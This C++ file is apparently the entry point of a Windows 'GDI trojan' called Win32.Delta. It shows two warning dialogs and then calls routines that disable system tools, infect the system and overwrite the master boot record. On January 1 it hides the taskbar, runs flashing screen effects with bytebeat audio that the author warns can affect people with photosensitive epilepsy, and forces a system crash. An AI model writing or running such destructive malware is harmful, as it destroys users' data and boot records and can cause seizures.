#include "Delta.h"

INT LCDECL pWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd) {
	if (GetFileAttributesW(L"C:\\WINDOWS\\delta.inf") == INVALID_FILE_ATTRIBUTES) {
		if (MessageBoxW(NULL,
		L"WIN32.DELTA.EXE\n\nThis malware you are running was not made for people with photosensitive epilepsy and can harm your data beyond repair.\nNotCCR, Sickdows and Comium97 are not responsible for any damage made with it.\n\nRunning it on physical hardware? Shut the malware down and delete it.\nBut on a VM, you can just run it\n\nStill execute it?",
		L"GDI-Trojan.Win32.Delta (Special thx to RaduMinecraft)",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES || MessageBoxW(NULL,
		L"Final warning!\n\nNotCCR and VenraTech (Sickdows) are not responsible for any damages made with this trojan horse!\nStill proceed to execute it?",
		L"You didn\'t listen...",
		MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2) != IDYES) exit(0);
	}
	Payloads::SystemToolDisable();
	Payloads::InfectSys();
	if (System::DateCheck(DATE_MONTH) == 1 && System::DateCheck(DATE_DAY) == 1) {
		System::HideFileW(getCurrentDir());
		InvalidateRect(NULL, NULL, FALSE); // Refreshes the screen like on Windows 7
		Payloads::OverwriteMBR();
		CreateThread(NULL, 0, &Payloads::TextProc, NULL, 0, 0);
		ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE); // Hides the taskbar
		Sleep(5000);
//		HEAP model = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0); Why?
		// 3D rotating... thing. //
		CreateThread(NULL, 0, &_3D::Model3D, NULL, 0, 0);
		
			// COLORPAL32 moving XOR //
			HANDLE hTMXOR = CreateThread(NULL, 0, &Shaders::TiltedMovingXORRGB, NULL, 0, 0); // Rotated XOR (it moves)
			Bytebeat::Bytebeat1();
			WaitForSingleObject(hTMXOR, 29000);
			CloseHandle(hTMXOR);
			Refresh();
			hwo_reset();
			Sleep(100);
			
//			HEAP hsv = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_NO_SERIALIZE, sizeof(CHAR) * 8192 * 64, 0); Why though?
			HANDLE hSRGBM = CreateThread(NULL, 0, &Shaders::StripedRGBMovement, NULL, 0, 0); // Uses a height value
			Bytebeat::wBytebeat2();
			WaitForSingleObject(hSRGBM, 30000);
			CloseHandle(hSRGBM);
//			HeapDestroy(hsv);
			hwo_reset();
			Refresh();
			Sleep(100);
			
			HANDLE hASR = CreateThread(NULL, 0, &GDI::AngledSineRotation, NULL, 0, 0);
			Sleep(1);
			HANDLE hRANDF = CreateThread(NULL, 0, &Shaders::RainbowANDFractals, NULL, 0, 0); // (Also moving) Sierpinski triangles
			Bytebeat::Bytebeat3();
			WaitForSingleObject(hASR, 31000);
			WaitForSingleObject(hRANDF, 1);
			CloseHandle(hASR); CloseHandle(hRANDF);
			hwo_reset();
			Refresh();
			Sleep(100);
			
			if (System::IfWindowsXP()) {
				HANDLE hTP = CreateThread(NULL, 0, &Shaders::TangentPlasma, NULL, 0, 0); // Wave shader
				Bytebeat::Bytebeat4();
				WaitForSingleObject(hTP, 30000);
				CloseHandle(hTP);
				hwo_reset();
				Refresh();
				
				HANDLE hOFC = CreateThread(NULL, 0, &Shaders::ORFractalClutter, NULL, 0, 0);
				Sleep(1);
				HANDLE hAG = CreateThread(NULL, 0, &GDI::AlphaGliding, NULL, 0, 0);
				Bytebeat::Bytebeat5();
				WaitForSingleObject(hOFC, 29000);
				WaitForSingleObject(hAG, 1);
				CloseHandle(hOFC); CloseHandle(hAG);
				hwo_reset();
				Refresh();
				
				HANDLE hRC = CreateThread(NULL, 0, &Shaders::RandomCircle, NULL, 0, 0);
				Sleep(1);
				HANDLE hGT = CreateThread(NULL, 0, &GDI::GradientTriangles, NULL, 0, 0);
				Bytebeat::Bytebeat6();
				WaitForSingleObject(hRC, 30000);
				WaitForSingleObject(hGT, 1);
				CloseHandle(hRC); CloseHandle(hGT);
				hwo_reset();
				Refresh();
				
				HANDLE hVP = CreateThread(NULL, 0, &Shaders::VerticalPlasma, NULL, 0, 0);
				Sleep(1);
				HANDLE hIP = CreateThread(NULL, 0, &GDI::IconPattern, NULL, 0, 0);
				Bytebeat::Bytebeat7();
				WaitForSingleObject(hVP, 31000);
				WaitForSingleObject(hIP, 1);
				CloseHandle(hVP); CloseHandle(hIP);
				hwo_reset();
				Refresh();
				
				HANDLE hAVRZ = CreateThread(NULL, 0, &Shaders::ANDVerticalRotozoomer, NULL, 0, 0);
				Sleep(1);
				HANDLE hGLTO = CreateThread(NULL, 0, &GDI::GreekLetterTexts, NULL, 0, 0);
				Bytebeat::Bytebeat8();
				WaitForSingleObject(hAVRZ, 30000);
				WaitForSingleObject(hGLTO, 1);
				CloseHandle(hAVRZ); CloseHandle(hGLTO);
				hwo_reset();
				Refresh();
				
				HANDLE hHALFSTR = CreateThread(NULL, 0, &GDI::NoHalftoneStretch, NULL, 0, 0);
				Sleep(1);
				HANDLE hPIXSLP = CreateThread(NULL, 0, &Shaders::PixelatedSlopes, NULL, 0, 0);
				Bytebeat::Bytebeat9();
				WaitForSingleObject(hHALFSTR, 29000);
				WaitForSingleObject(hPIXSLP, 1);
				TerminateThread(hHALFSTR, 0); // Had no other choice
				CloseHandle(hHALFSTR); CloseHandle(hPIXSLP);
				hwo_reset();
				Refresh();
				
				
				HANDLE hGAUSBLR = CreateThread(NULL, 0, &GDI::GaussianBlur, NULL, 0, 0);
				Sleep(1);
				HANDLE hTINTSPI = CreateThread(NULL, 0, &Shaders::pTintedSepia, NULL, 0, 0);
				Bytebeat::Bytebeat10();
				WaitForSingleObject(hGAUSBLR, 30000);
				WaitForSingleObject(hTINTSPI, 1);
				CloseHandle(hGAUSBLR); CloseHandle(hTINTSPI);
				hwo_reset();
				Refresh();
				
				HANDLE hPATBAND = CreateThread(NULL, 0, &GDI::PatBands, NULL, 0, 0);
				Sleep(1);
				HANDLE hINVTRI = CreateThread(NULL, 0, &GDI::InvertTriangles, NULL, 0, 0);
				Sleep(1);
				HANDLE hFINNOI = CreateThread(NULL, 0, &Shaders::pFinalNoise, NULL, 0, 0);
				Bytebeat::Bytebeat11();
				WaitForSingleObject(hPATBAND, 31000);
				WaitForSingleObject(hINVTRI, 1);
				WaitForSingleObject(hFINNOI, 1);
				CloseHandle(hPATBAND); CloseHandle(hINVTRI); CloseHandle(hFINNOI);
				hwo_reset();
				System::NtCrashSystem(0xc000001f, NRHE_SHUTDOWN_RESPONSE_OPTION, FALSE, NULL);
			}
			else {
				HANDLE hTUNNEL = CreateThread(NULL, 0, &GDI::NotWinXPTunnelling, NULL, 0, 0);
				WaitForSingleObject(hTUNNEL, 30000);
				System::NtCrashSystem(0xc000001f, NRHE_SHUTDOWN_RESPONSE_OPTION, FALSE, NULL);
			}
	}
}
